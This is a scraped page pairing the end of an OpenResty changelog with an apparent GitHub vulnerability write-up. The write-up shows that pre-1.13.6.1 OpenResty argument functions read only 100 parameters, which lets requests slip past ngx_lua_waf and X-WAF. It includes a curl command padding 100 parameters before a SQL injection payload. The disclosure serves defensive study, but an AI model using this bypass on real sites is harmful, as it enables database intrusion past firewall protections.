    - PPC: Add soft-float support to JIT compiler backend. Contributed by Djordje Kovacevic and Stefan Pejic from RT-RK.com. Sponsored by Cisco Systems, Inc.
    - x64/`LJ_GC64`: Fix fallback case of `asm_fuseloadk64()`. Contributed by Peter Cawley.

See [ChangeLog 1.11.2](changelog-1011002.html "ChangeLog 1.11.2") for change log for [OpenResty](openresty.html "OpenResty") 1.11.2.x.

## More Interesting Topics

[![](../images/header-images/en-python-high-disk.jpg)

Pinpointing the Python Code Paths with High Disk I/O (using OpenResty XRay)](https://blog.openresty.com/en/python-high-disk/?src=org)
[![](../images/header-images/en-php-exceptions.jpg)

How to Trace Exceptions inside PHP Applications (using OpenResty XRay)](https://blog.openresty.com/en/php-exceptions/?src=org)
[![](../images/header-images/en-xray-agent-install-k8s.jpg)

Install OpenResty XRay’s Agents on Kubernetes cluster](https://blog.openresty.com/en/xray-agent-install-k8s/?src=org)
[![](../images/header-images/en-edge-k8s-autoapprove.jpg)

How to Automate Managing Gateway Servers in K8s Environment (using OpenResty Edge)](https://blog.openresty.com/en/edge-k8s-autoapprove/?src=org)
[![](../images/header-images/en-edge-lua-ext.jpg)

Use Lua Extensions to Respond to Gateway Server Offline Events in OpenResty Edge](https://blog.openresty.com/en/edge-lua-ext/?src=org)
[![](../images/header-images/en-rust-high-disk.jpg)

Pinpointing the Hottest Rust Code Paths with High Disk I/O (using OpenResty XRay)](https://blog.openresty.com/en/rust-high-disk/?src=org)
[![](../images/header-images/xray-mobile-app-android-en.jpg)

Introduction to OpenResty XRay Mobile Apps](https://blog.openresty.com/en/xray-mobile-apps/?src=org)
[![](../images/header-images/en-php-high-mem.jpg)

Locate Large Memory Objects inside PHP Processes (using OpenResty XRay)](https://blog.openresty.com/en/php-high-mem/?src=org)
[![](../images/header-images/en-edge-gateway-healthcheck.jpg)

Enable Automatic Healthcheck for Gateway Servers in OpenResty Edge](https://blog.openresty.com/en/edge-gateway-healthcheck/?src=org)
[![](../images/header-images/edge-gateway-partition-en.jpg)

How to Use Gateway Partitions in OpenResty Edge](https://blog.openresty.com/en/edge-gateway-partition/?src=org)
[![](../images/header-images/edge-restore-client-addr-en.jpg)

Accurately Restore the Real Client IP Address in OpenResty Edge](https://blog.openresty.com/en/edge-restore-client-addr/?src=org)
[![](../images/header-images/cpp-trace-cpp.jpg)

Use C++ to Dynamic-Trace C++ Applications](https://blog.openresty.com/en/cpp-trace-cpp/?src=org)
[![](../images/header-images/en-erlang-high-cpu.jpg)

Pinpointing the hottest Erlang code paths with high CPU usage (using OpenResty XRay)](https://blog.openresty.com/en/erlang-high-cpu/?src=org)
[![](../images/header-images/en-perl-exceptions.jpg)

How to Trace Exceptions inside Perl Applications (using OpenResty XRay)](https://blog.openresty.com/en/perl-exceptions/?src=org)
[![](../images/header-images/en-nodwarf.jpg)

Analyze OpenResty/Nginx Applications without Debug Symbols (using OpenResty XRay)](https://blog.openresty.com/en/nodwarf/?src=org)
[![](../images/header-images/xray-or-core-dump-en.jpg)

Automatic Core Dump Analysis (using OpenResty XRay)](https://blog.openresty.com/en/xray-or-core-dump/?src=org)
[![](../images/header-images/en-xray-agent-install-amazon-linux2.jpg)

Install OpenResty XRay’s Agents on Amazon Linux via Package Bundles](https://blog.openresty.com/en/xray-agent-install-amazon-linux2/?src=org)
[![](../images/header-images/go-high-disk-en.jpg)

Pinpointing the Hottest Go Code Paths with High Disk I/O (using OpenResty XRay)](https://blog.openresty.com/en/go-high-disk/?src=org)
[![](../images/header-images/edge-dns-permission-en.jpg)

Control Access to DNS Applications in OpenResty Edge's Admin Console](https://blog.openresty.com/en/edge-dns-permission/?src=org)
[![](../images/header-images/en-envoy-cpu-distr.jpg)

How CPU Time is Spent inside Envoy Servers (using OpenResty XRay)](https://blog.openresty.com/en/envoy-cpu-distr/?src=org)

* Timeline

* ### 17 Oct 2024

  + [OpenResty 1.27.1.1 Released](ann-1027001001.html)
* ### 15 Oct 2024

  + [Download](download.html)
  + [ChangeLog for 1.27.1.x](changelog-1027001.html)
* ### 12 Oct 2024

  + [OpenResty® Linux Packages](linux-packages.html)
* ### 21 Jul 2024

  + [ChangeLog for 1.25.3.x](changelog-1025003.html)
  + [ChangeLog for 1.19.9.x](changelog-1019009.html)
  + [ChangeLog for 1.21.4.x](changelog-1021004.html)
  + [OpenResty 1.21.4.4 Released](ann-1021004004.html)
  + [OpenResty 1.25.3.2 Released](ann-1025003002.html)
  + [OpenResty 1.19.9.2 Released](ann-1019009002.html)
* ### 13 Mar 2024

  + [Installation](installation.html)
* ### 16 Jan 2024

  + [eBooks](ebooks.html)
* ### 09 Jan 2024

  + [OpenResty 1.25.3.1 Released](ann-1025003001.html)
* ### 18 Dec 2023

  + [Enterprise Solutions](commercial.html)
* ### 12 Dec 2023

  + [OpenResty® RPM Packages](rpm-packages.html)
  + [OpenResty® Alpine APK Packages](apk-packages.html)
  + [OpenResty® Deb Packages](deb-packages.html)

---

OpenResty® is a registered trademark owned by [OpenResty Inc](https://openresty.com/).

Copyright © 2017, 2018, 2019, 2020, 2021, 2022 by Yichun Zhang (agentzh)

100% Powered by OpenResty and PostgreSQL
([view the source code of this site](https://github.com/openresty/openresty.org/))



=== Content from github.com_4cf0a143_20250125_155953.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FBypass007%2Fvuln%2Fblob%2Fmaster%2FOpenResty%2FUri%2520parameter%2520overflow%2520in%2520Openresty.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FBypass007%2Fvuln%2Fblob%2Fmaster%2FOpenResty%2FUri%2520parameter%2520overflow%2520in%2520Openresty.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Bypass007%2Fvuln)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Bypass007](/Bypass007)
/
**[vuln](/Bypass007/vuln)**
Public

* [Notifications](/login?return_to=%2FBypass007%2Fvuln) You must be signed in to change notification settings
* [Fork
  18](/login?return_to=%2FBypass007%2Fvuln)
* [Star
   44](/login?return_to=%2FBypass007%2Fvuln)

* [Code](/Bypass007/vuln)
* [Issues
  2](/Bypass007/vuln/issues)
* [Pull requests
  1](/Bypass007/vuln/pulls)
* [Actions](/Bypass007/vuln/actions)
* [Projects
  0](/Bypass007/vuln/projects)
* [Security](/Bypass007/vuln/security)
* [Insights](/Bypass007/vuln/pulse)

Additional navigation options

* [Code](/Bypass007/vuln)
* [Issues](/Bypass007/vuln/issues)
* [Pull requests](/Bypass007/vuln/pulls)
* [Actions](/Bypass007/vuln/actions)
* [Projects](/Bypass007/vuln/projects)
* [Security](/Bypass007/vuln/security)
* [Insights](/Bypass007/vuln/pulse)

## Files

 master
## Breadcrumbs

1. [vuln](/Bypass007/vuln/tree/master)
2. /[OpenResty](/Bypass007/vuln/tree/master/OpenResty)
/
# Uri parameter overflow in Openresty.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Bypass007/vuln/commits/master/OpenResty/Uri%20parameter%20overflow%20in%20Openresty.md)117 lines (69 loc) · 3.93 KB master
## Breadcrumbs

1. [vuln](/Bypass007/vuln/tree/master)
2. /[OpenResty](/Bypass007/vuln/tree/master/OpenResty)
/
# Uri parameter overflow in Openresty.md

Top
## File metadata and controls

* Preview
* Code
* Blame

117 lines (69 loc) · 3.93 KB[Raw](https://github.com/Bypass007/vuln/raw/refs/heads/master/OpenResty/Uri%20parameter%20overflow%20in%20Openresty.md)

#Uri parameter overflow in OpenResty

### General Description

Prior to the OpenResty 1.13.6.1 version, URI parameters were obtained using the ngx.req.get\_uri\_args, ngx.req.get\_post\_args functions, allowing remote attackers to bypass OpenResty based security and affect multiple open source WAF.

### Details

First look at the official API document. There are two ways to get a URI: ngx.req.get\_uri\_args, ngx.req.get\_post\_args. The main difference between the two is the difference between the parameter sources, the ngx.req.get\_uri\_args acquires the URI request parameters, and the ngx.req.get\_post\_args gets the content from the post request.

Test case：

`server {
listen 80;
server\_name localhost;

location /print\_param {
content\_by\_lua\_block {
local arg = ngx.req.get\_uri\_args()
for k,v in pairs(arg) do
ngx.say("[GET ] key:", k, " v:", v)
end

```
       ngx.req.read_body()
       local arg = ngx.req.get_post_args()
       for k,v in pairs(arg) do
           ngx.say("[POST] key:", k, " v:", v)
       end
   }

```

}
}`

When the same parameter ID is submitted, it is sorted according to the order of received parameters.

However, when the parameter ID is used to transform the case, such as Id, iD and ID, it will be regarded as different parameters.

[![](/Bypass007/vuln/raw/master/OpenResty/2.png)](/Bypass007/vuln/blob/master/OpenResty/2.png)

####Uri parameter overflow

What happens if we do not have a segment parameter, so I construct a test case that is convenient for display, a0-a9, 10\*10, a total of 100 parameters, and then add the 101st parameters to the SQL injection Payload, let's see what happens?

Test cases:

curl '127.0.0.1/test?
a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&
a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&
a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&
a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&
a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&
a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&
a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&
a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&
a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&
a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&
id=1 union select 1,schema\_name,3 from INFORMATION\_SCHEMA.schemata'

Output results:

[![](/Bypass007/vuln/raw/master/OpenResty/3.png)](/Bypass007/vuln/blob/master/OpenResty/3.png)

It can be seen that using ngx.req.get\_uri\_args to get URI request parameters, we only get the first 100 parameters, and the 101st parameter is not obtained.

Continue to construct a POST request and look at it.

[![](/Bypass007/vuln/raw/master/OpenResty/4.png)](/Bypass007/vuln/blob/master/OpenResty/4.png)

The content of post request obtained by ngx.req.get\_post\_args also obtains the first 100 parameters.

To sum up, the first 100 parameters can be obtained by ngx.req.get\_uri\_args and ngx.req.get\_post\_args. When the 101st parameters are submitted, the parameters of the URI parameters are overrun and the parameter values after 100th are not properly obtained.

Based on the security protection of the ngx\_lua development, it is impossible for the attacker to carry out effective security detection for the 100th subsequent parameters submitted by the attacker, thus bypassing the security defense.

### Impact products

####A、ngx\_lua\_waf

Ngx\_lua\_waf is a web application firewall based on lua-nginx-module (openresty).

Using ngx.req.get\_uri\_args and ngx.req.get\_post\_args to get URI parameters.

github：<https://github.com/loveshell/ngx_lua_waf>

**Interception effect diagram：**

[![](/Bypass007/vuln/raw/master/OpenResty/5.png)](/Bypass007/vuln/blob/master/OpenResty/5.png)

**Using uri parameter overflow Bypass：**

[![](/Bypass007/vuln/raw/master/OpenResty/6.png)](/Bypass007/vuln/blob/master/OpenResty/6.png)

####B、X-WAF

X-WAF is a cloud WAF system suitable for small and medium-sized businesses, enabling small and medium-sized businesses to have their own free cloud WAF conveniently.

Using ngx.req.get\_uri\_args and ngx.req.get\_post\_args to get URI parameters.

The official website：<https://waf.xsec.io>

github：<https://github.com/xsec-lab/x-waf>

**Interception effect diagram：**

[![](/Bypass007/vuln/raw/master/OpenResty/7.png)](/Bypass007/vuln/blob/master/OpenResty/7.png)

**Using uri parameter overflow Bypass：**

[![](/Bypass007/vuln/raw/master/OpenResty/8.png)](/Bypass007/vuln/blob/master/OpenResty/8.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


